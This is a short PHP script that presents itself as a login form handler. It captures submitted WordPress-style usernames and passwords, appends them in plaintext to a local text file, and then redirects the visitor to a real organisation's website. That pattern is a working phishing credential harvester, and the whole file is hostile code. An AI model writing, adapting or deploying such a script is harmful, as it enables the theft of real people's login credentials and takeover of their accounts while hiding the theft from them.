<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve the form data
    $username = isset($_POST['log']) ? $_POST['log'] : '';
    $password = isset($_POST['pwd']) ? $_POST['pwd'] : '';
    $rememberMe = isset($_POST['rememberme']) ? 'Yes' : 'No';

    // Log the data (you can change this to save in a database or file)
    $logData = "Username: $username\nPassword: $password\nRemember Me: $rememberMe\n";
    
    // Append the log data to a file
    file_put_contents('login_responses.txt', $logData, FILE_APPEND);

    // Redirect to the original login action (you can change this to your intended page)
    header('Location: https://yorktontribalcouncil.ca/');
    exit();
}
?>
